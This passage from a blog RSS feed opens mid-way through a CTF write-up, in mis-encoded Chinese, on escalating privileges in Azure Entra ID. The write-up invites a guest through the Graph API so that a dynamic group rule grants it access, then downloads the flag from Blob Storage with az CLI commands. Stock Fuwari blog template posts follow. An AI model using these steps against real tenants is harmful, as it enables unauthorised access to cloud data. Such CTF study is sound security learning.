&lt;p&gt;ç»“åˆç°åœ¨æ‹¥æœ‰çš„æƒé™ï¼ˆé‚€è¯·Guestç”¨æˆ·ï¼‰ï¼Œæˆ‘ä»¬ä½¿ç”¨ç¬¬äºŒä¸ªæ¡ä»¶åº”è¯¥å°±å¯ä»¥æ‹¿åˆ°è®¿é—®æƒé™ï¼Œå³ï¼šç”¨&quot;Group.Read.All&quot;çš„æƒé™ï¼Œé‚€è¯·ä¸€ä¸ªGuestï¼Œä¸”ä»–çš„displayNameä¸º&quot;ctfxxxx&quot;ï¼Œè¿™æ ·ä»–å°±ä¼šè¢«åŠ¨æ€ç»„è‡ªåŠ¨æ‹‰åˆ°&quot;Users assigned access to flag&quot;ç»„ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆæ³¨å†Œä¸€ä¸ªå‰ç¼€ä¸ºctfçš„é‚®ç®±å§å…ˆã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/09.png&quot; alt=&quot;image-20251218182219709&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç„¶åæ„é€ è¯·æ±‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;curl -X POST -H &quot;Authorization: Bearer $TOKEN&quot; -H &quot;Content-Type: application/json&quot;   https://graph.microsoft.com/v1.0/invitations -d &apos;{
    &quot;invitedUserEmailAddress&quot;: &quot;ctfsususu@proton.me&quot;,
    &quot;invitedUserDisplayName&quot;: &quot;CTF-Flag-Access&quot;,
    &quot;inviteRedirectUrl&quot;: &quot;https://portal.azure.com&quot;,                                         
    &quot;sendInvitationMessage&quot;: false
  }&apos;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/10.png&quot; alt=&quot;image-20251218182548404&quot; /&gt;&lt;/p&gt;
&lt;p&gt;jqä¸€ä¸‹æ–¹ä¾¿é˜…è¯»&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/11.png&quot; alt=&quot;image-20251218182816395&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç»™äº†ä¸€ä¸ªå…‘æ¢é‚€è¯·çš„é“¾æ¥ï¼Œç›´æ¥checkï¼Œç„¶åè·Ÿç€æ­¥éª¤å¾€åæ“ä½œã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/12.png&quot; alt=&quot;image-20251218182915014&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/13.png&quot; alt=&quot;image-20251218182955285&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/14.png&quot; alt=&quot;image-20251218183014187&quot; /&gt;&lt;/p&gt;
&lt;p&gt;é€‰æ‹©ç»„ç»‡ç™»å½•ï¼ŒåŸŸåä¸ºå‰é¢ç»™å’±ä»¬â€œç®¡ç†å‘˜â€è´¦å·çš„å†…ä¸ªã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/15.png&quot; alt=&quot;image-20251218183818740&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/16.png&quot; alt=&quot;image-20251218183848433&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/17.png&quot; alt=&quot;image-20251218183909298&quot; /&gt;&lt;/p&gt;
&lt;p&gt;å®‰è£…Authenticatorå¹¶éªŒè¯å®Œæˆåå°±åˆ°æ§åˆ¶å°äº†ã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/18.png&quot; alt=&quot;image-20251218184254721&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è®¿é—®https://microsoft.com/deviceloginä»¥åœ¨CLIä¸­å®ŒæˆDevice Code Flowï¼›&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/19.png&quot; alt=&quot;image-20251218184431219&quot; /&gt;&lt;/p&gt;
&lt;p&gt;åœ¨é¢˜ç›®ç¯å¢ƒçš„CLIé‡Œè·‘è¿™ä¸ªå‘½ä»¤ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;az login --tenant [å—å®³ç§Ÿæˆ·id] --use-device-code
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/20.png&quot; alt=&quot;image-20251218185021457&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¾“å…¥ä»£ç åè·Ÿç€æµç¨‹ç»§ç»­æ“ä½œå°±è¡Œã€‚&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/21.png&quot; alt=&quot;image-20251218185051324&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/22.png&quot; alt=&quot;image-20251218185104516&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/23.png&quot; alt=&quot;image-20251218185120622&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/24.png&quot; alt=&quot;image-20251218185803360&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç™»å½•æˆåŠŸï¼Œè®¿é—®https://myapps.microsoft.com/?tenantid=d26f353d-c564-48e7-b26f-aa48c6eecd58çœ‹çœ‹åˆ†é…çš„app&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/25.png&quot; alt=&quot;image-20251218185341274&quot; /&gt;&lt;/p&gt;
&lt;p&gt;ç›´æ¥è®¿é—®å‘ç°æ²¡æœ‰æƒé™ï¼Œä¸”è¢«é‡å®šå‘ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;https://azurechallengectfflag.blob.core.windows.net/grab-the-flag/ctf_flag.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/26.png&quot; alt=&quot;image-20251218190042234&quot; /&gt;&lt;/p&gt;
&lt;p&gt;è¿™è¯´æ˜â€œCTF Challenge Flagâ€ è¿™ä¸ªä¼ä¸šåº”ç”¨ï¼Œæœ¬è´¨ä¸Šåªæ˜¯ä¸€ä¸ªå…¥å£ï¼Œå®ƒçœŸæ­£ä¿æŠ¤çš„èµ„æºæ˜¯ Azure Blob Storage é‡Œçš„ä¸€ä¸ªæ–‡ä»¶ã€‚åœ¨ Azure é‡Œè¿™æ˜¯éå¸¸å¸¸è§çš„è®¾è®¡ï¼ŒEntra IDï¼ˆAADï¼‰è´Ÿè´£èº«ä»½ &amp;amp; æˆæƒï¼ŒBlob Storageè´Ÿè´£å­˜å‚¨çœŸå®æ•°æ®ï¼Œä¼ä¸šappæŠŠâ€œè°èƒ½è®¿é—®å“ªä¸ªå­˜å‚¨â€è¿èµ·æ¥ã€‚ç”±äºæˆ‘ä»¬æ˜¯åŒ¿åè®¿é—®ï¼Œæ‰€ä»¥æ— æ³•è®¿é—®ï¼Œé‚£æˆ‘ä»¬å°±åœ¨CLIä½¿ç”¨å½“å‰ az ç™»å½•çš„èº«ä»½ï¼Œè‡ªåŠ¨å‘ Azure AD è¯·æ±‚ tokenï¼ŒæŠŠ token å¸¦ç»™ Blob Storageã€‚&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;az storage blob download --account-name azurechallengectfflag --container-name grab-the-flag --name ctf_flag.txt --file &quot;ctf_flag.txt&quot; --auth-mode login
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/27.png&quot; alt=&quot;image-20251218185848665&quot; /&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/28.png&quot; alt=&quot;image-20251218185858949&quot; /&gt;&lt;/p&gt;
&lt;p&gt;Get&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/Users/SuMio/Pictures/blog/20251214/29.png&quot; alt=&quot;image-20251218190137915&quot; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;WIZ_CTF{EntraID_Sensitive_Privileges_Breaking_Barriers}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;æ ¸å¿ƒè€ƒç‚¹&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;OAuth App æ»¥ç”¨ï¼ˆApp-only æƒé™ï¼‰&lt;/li&gt;
&lt;li&gt;Guest Invite æ”»å‡»é¢&lt;/li&gt;
&lt;li&gt;Azure Dynamic Group è§„åˆ™è®¾è®¡ç¼ºé™·&lt;/li&gt;
&lt;li&gt;displayName è‡ªåŠ¨æ´¾ç”Ÿè¡Œä¸º&lt;/li&gt;
&lt;li&gt;Group â†’ RBAC â†’ Storage æƒé™ç»§æ‰¿&lt;/li&gt;
&lt;li&gt;Azure AD Authentication for Blob Storage&lt;/li&gt;
&lt;li&gt;App é…ç½®ä¸å¯è¯» â‰  èµ„æºä¸å¯ç”¨&lt;/li&gt;
&lt;/ul&gt;
</content:encoded></item><item><title>Draft Example</title><link>https://25pm-sumio.github.io/posts/draft/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/draft/</guid><pubDate>Fri, 01 Jul 2022 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;This Article is a Draft&lt;/h1&gt;
&lt;p&gt;This article is currently in a draft state and is not published. Therefore, it will not be visible to the general audience. The content is still a work in progress and may require further editing and review.&lt;/p&gt;
&lt;p&gt;When the article is ready for publication, you can update the &quot;draft&quot; field to &quot;false&quot; in the Frontmatter:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
title: Draft Example
published: 2024-01-11T04:40:26.381Z
tags: [Markdown, Blogging, Demo]
category: Examples
draft: false
---
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Simple Guides for Fuwari</title><link>https://25pm-sumio.github.io/posts/guide/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/guide/</guid><description>How to use this blog template.</description><pubDate>Mon, 01 Apr 2024 00:00:00 GMT</pubDate><content:encoded>&lt;blockquote&gt;
&lt;p&gt;Cover image source: &lt;a href=&quot;https://image.civitai.com/xG1nkqKTMzGDvpLrqFT7WA/208fc754-890d-4adb-9753-2c963332675d/width=2048/01651-1456859105-(colour_1.5),girl,_Blue,yellow,green,cyan,purple,red,pink,_best,8k,UHD,masterpiece,male%20focus,%201boy,gloves,%20ponytail,%20long%20hair,.jpeg&quot;&gt;Source&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This blog template is built with &lt;a href=&quot;https://astro.build/&quot;&gt;Astro&lt;/a&gt;. For the things that are not mentioned in this guide, you may find the answers in the &lt;a href=&quot;https://docs.astro.build/&quot;&gt;Astro Docs&lt;/a&gt;.&lt;/p&gt;
&lt;h2&gt;Front-matter of Posts&lt;/h2&gt;
&lt;pre&gt;&lt;code&gt;---
title: My First Blog Post
published: 2023-09-09
description: This is the first post of my new Astro blog.
image: ./cover.jpg
tags: [Foo, Bar]
category: Front-end
draft: false
---
&lt;/code&gt;&lt;/pre&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;Attribute&lt;/th&gt;
&lt;th&gt;Description&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;title&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The title of the post.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;published&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The date the post was published.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;description&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;A short description of the post. Displayed on index page.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;image&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The cover image path of the post.&amp;lt;br/&amp;gt;1. Start with &lt;code&gt;http://&lt;/code&gt; or &lt;code&gt;https://&lt;/code&gt;: Use web image&amp;lt;br/&amp;gt;2. Start with &lt;code&gt;/&lt;/code&gt;: For image in &lt;code&gt;public&lt;/code&gt; dir&amp;lt;br/&amp;gt;3. With none of the prefixes: Relative to the markdown file&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;tags&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The tags of the post.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;category&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;The category of the post.&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;draft&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;If this post is still a draft, which won&apos;t be displayed.&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2&gt;Where to Place the Post Files&lt;/h2&gt;
&lt;p&gt;Your post files should be placed in &lt;code&gt;src/content/posts/&lt;/code&gt; directory. You can also create sub-directories to better organize your posts and assets.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;src/content/posts/
â”œâ”€â”€ post-1.md
â””â”€â”€ post-2/
    â”œâ”€â”€ cover.png
    â””â”€â”€ index.md
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Markdown Extended Features</title><link>https://25pm-sumio.github.io/posts/markdown-extended/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/markdown-extended/</guid><description>Read more about Markdown features in Fuwari</description><pubDate>Wed, 01 May 2024 00:00:00 GMT</pubDate><content:encoded>&lt;h2&gt;GitHub repository cards&lt;/h2&gt;
&lt;p&gt;You can add dynamic cards that link to GitHub repositories, on page load, the repository information is pulled from the GitHub API.&lt;/p&gt;
&lt;p&gt;::github{repo=&quot;Fabrizz/MMM-OnSpotify&quot;}&lt;/p&gt;
&lt;p&gt;Create a GitHub repository card with the code &lt;code&gt;::github{repo=&quot;&amp;lt;owner&amp;gt;/&amp;lt;repo&amp;gt;&quot;}&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;::github{repo=&quot;saicaca/fuwari&quot;}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;Admonitions&lt;/h2&gt;
&lt;p&gt;Following types of admonitions are supported: &lt;code&gt;note&lt;/code&gt; &lt;code&gt;tip&lt;/code&gt; &lt;code&gt;important&lt;/code&gt; &lt;code&gt;warning&lt;/code&gt; &lt;code&gt;caution&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;:::note
Highlights information that users should take into account, even when skimming.
:::&lt;/p&gt;
&lt;p&gt;:::tip
Optional information to help a user be more successful.
:::&lt;/p&gt;
&lt;p&gt;:::important
Crucial information necessary for users to succeed.
:::&lt;/p&gt;
&lt;p&gt;:::warning
Critical content demanding immediate user attention due to potential risks.
:::&lt;/p&gt;
&lt;p&gt;:::caution
Negative potential consequences of an action.
:::&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:::note
Highlights information that users should take into account, even when skimming.
:::

:::tip
Optional information to help a user be more successful.
:::
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The title of the admonition can be customized.&lt;/p&gt;
&lt;p&gt;:::note[MY CUSTOM TITLE]
This is a note with a custom title.
:::&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;:::note[MY CUSTOM TITLE]
This is a note with a custom title.
:::
&lt;/code&gt;&lt;/pre&gt;
&lt;blockquote&gt;
&lt;p&gt;[!TIP]
&lt;a href=&quot;https://github.com/orgs/community/discussions/16925&quot;&gt;The GitHub syntax&lt;/a&gt; is also supported.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;pre&gt;&lt;code&gt;&amp;gt; [!NOTE]
&amp;gt; The GitHub syntax is also supported.

&amp;gt; [!TIP]
&amp;gt; The GitHub syntax is also supported.
&lt;/code&gt;&lt;/pre&gt;
</content:encoded></item><item><title>Markdown Example</title><link>https://25pm-sumio.github.io/posts/markdown/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/markdown/</guid><description>A simple example of a Markdown blog post.</description><pubDate>Sun, 01 Oct 2023 00:00:00 GMT</pubDate><content:encoded>&lt;h1&gt;An h1 header&lt;/h1&gt;
&lt;p&gt;Paragraphs are separated by a blank line.&lt;/p&gt;
&lt;p&gt;2nd paragraph. &lt;em&gt;Italic&lt;/em&gt;, &lt;strong&gt;bold&lt;/strong&gt;, and &lt;code&gt;monospace&lt;/code&gt;. Itemized lists
look like:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;this one&lt;/li&gt;
&lt;li&gt;that one&lt;/li&gt;
&lt;li&gt;the other one&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Note that --- not considering the asterisk --- the actual text
content starts at 4-columns in.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Block quotes are
written like so.&lt;/p&gt;
&lt;p&gt;They can span multiple paragraphs,
if you like.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Use 3 dashes for an em-dash. Use 2 dashes for ranges (ex., &quot;it&apos;s all
in chapters 12--14&quot;). Three dots ... will be converted to an ellipsis.
Unicode is supported. â˜º&lt;/p&gt;
&lt;h2&gt;An h2 header&lt;/h2&gt;
&lt;p&gt;Here&apos;s a numbered list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;first item&lt;/li&gt;
&lt;li&gt;second item&lt;/li&gt;
&lt;li&gt;third item&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Note again how the actual text starts at 4 columns in (4 characters
from the left side). Here&apos;s a code sample:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Let me re-iterate ...
for i in 1 .. 10 { do-something(i) }
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As you probably guessed, indented 4 spaces. By the way, instead of
indenting the block, you can use delimited blocks, if you like:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;define foobar() {
    print &quot;Welcome to flavor country!&quot;;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;(which makes copying &amp;amp; pasting easier). You can optionally mark the
delimited block for Pandoc to syntax highlight it:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import time
# Quick, count to ten!
for i in range(10):
    # (but not *too* quick)
    time.sleep(0.5)
    print i
&lt;/code&gt;&lt;/pre&gt;
&lt;h3&gt;An h3 header&lt;/h3&gt;
&lt;p&gt;Now a nested list:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;First, get these ingredients:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;carrots&lt;/li&gt;
&lt;li&gt;celery&lt;/li&gt;
&lt;li&gt;lentils&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Boil some water.&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Dump everything in the pot and follow
this algorithm:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt; find wooden spoon
 uncover pot
 stir
 cover pot
 balance wooden spoon precariously on pot handle
 wait 10 minutes
 goto first step (or shut off burner when done)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Do not bump wooden spoon or it will fall.&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Notice again how text always lines up on 4-space indents (including
that last line which continues item 3 above).&lt;/p&gt;
&lt;p&gt;Here&apos;s a link to &lt;a href=&quot;http://foo.bar&quot;&gt;a website&lt;/a&gt;, to a &lt;a href=&quot;local-doc.html&quot;&gt;local
doc&lt;/a&gt;, and to a &lt;a href=&quot;#an-h2-header&quot;&gt;section heading in the current
doc&lt;/a&gt;. Here&apos;s a footnote [^1].&lt;/p&gt;
&lt;p&gt;[^1]: Footnote text goes here.&lt;/p&gt;
&lt;p&gt;Tables can look like this:&lt;/p&gt;
&lt;p&gt;size material color&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;9 leather brown
10 hemp canvas natural
11 glass transparent&lt;/p&gt;
&lt;p&gt;Table: Shoes, their sizes, and what they&apos;re made of&lt;/p&gt;
&lt;p&gt;(The above is the caption for the table.) Pandoc also supports
multi-line tables:&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;keyword text&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;red Sunsets, apples, and
other red or reddish
things.&lt;/p&gt;
&lt;p&gt;green Leaves, grass, frogs
and other things it&apos;s
not easy being.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;A horizontal rule follows.&lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;Here&apos;s a definition list:&lt;/p&gt;
&lt;p&gt;apples
: Good for making applesauce.
oranges
: Citrus!
tomatoes
: There&apos;s no &quot;e&quot; in tomatoe.&lt;/p&gt;
&lt;p&gt;Again, text is indented 4 spaces. (Put a blank line between each
term/definition pair to spread things out more.)&lt;/p&gt;
&lt;p&gt;Here&apos;s a &quot;line block&quot;:&lt;/p&gt;
&lt;p&gt;| Line one
| Line too
| Line tree&lt;/p&gt;
&lt;p&gt;and images can be specified like so:&lt;/p&gt;
&lt;p&gt;Inline math equations go in like so: $\omega = d\phi / dt$. Display
math should get its own line and be put in in double-dollarsigns:&lt;/p&gt;
&lt;p&gt;$$I = \int \rho R^{2} dV$$&lt;/p&gt;
&lt;p&gt;And note that you can backslash-escape any punctuation characters
which you wish to be displayed literally, ex.: `foo`, *bar*, etc.&lt;/p&gt;
</content:encoded></item><item><title>Include Video in the Posts</title><link>https://25pm-sumio.github.io/posts/video/</link><guid isPermaLink="true">https://25pm-sumio.github.io/posts/video/</guid><description>This post demonstrates how to include embedded video in a blog post.</description><pubDate>Tue, 01 Aug 2023 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;Just copy the embed code from YouTube or other platforms, and paste it in the markdown file.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;---
title: Include Video in the Post
published: 2023-10-19
// ...
---

&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/5gIf0_xpFPI?si=N1WTorLKL0uwLsU_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;h2&gt;YouTube&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;https://www.youtube.com/embed/5gIf0_xpFPI?si=N1WTorLKL0uwLsU_&quot; title=&quot;YouTube video player&quot; frameborder=&quot;0&quot; allow=&quot;accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share&quot; allowfullscreen&amp;gt;&amp;lt;/iframe&amp;gt;&lt;/p&gt;
&lt;h2&gt;Bilibili&lt;/h2&gt;
&lt;p&gt;&amp;lt;iframe width=&quot;100%&quot; height=&quot;468&quot; src=&quot;//player.bilibili.com/player.html?bvid=BV1fK4y1s7Qf&amp;amp;p=1&quot; scrolling=&quot;no&quot; border=&quot;0&quot; frameborder=&quot;no&quot; framespacing=&quot;0&quot; allowfullscreen=&quot;true&quot;&amp;gt; &amp;lt;/iframe&amp;gt;&lt;/p&gt;
</content:encoded></item></channel></rss>